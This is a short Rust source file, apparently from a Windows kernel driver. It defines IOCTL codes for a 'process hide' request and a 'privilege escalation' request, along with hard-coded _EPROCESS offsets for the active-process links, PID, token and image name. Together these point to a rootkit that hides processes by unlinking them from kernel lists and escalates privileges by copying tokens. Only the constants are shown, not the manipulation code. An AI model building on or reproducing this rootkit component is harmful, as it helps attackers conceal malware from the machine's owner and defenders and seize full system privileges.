
use wdk_sys::{FILE_DEVICE_UNKNOWN, METHOD_NEITHER, FILE_ANY_ACCESS};

macro_rules! CTL_CODE {
    ($DeviceType:expr, $Function:expr, $Method:expr, $Access:expr) => {
        ($DeviceType << 16) | ($Access << 14) | ($Function << 2) | $Method
    }
}

//IOCTL
pub const IOCTL_PROCESS_HIDE_REQUEST: u32 = CTL_CODE!(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS);
pub const IOCTL_PROCESS_PRIVILEGE_ESCALATION_REQUEST: u32 = CTL_CODE!(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS);


// OFFSETS

// _EPROCESS
pub const ACTIVE_PROCESS_LINKS_OFFSET: usize = 0x448;
pub const PID_OFFSET: usize = 0x440;
pub const TOKEN_OFFSET: usize = 0x4B8;
pub const IMAGE_FILE_NAME_OFFSET: usize = 0x5a8;
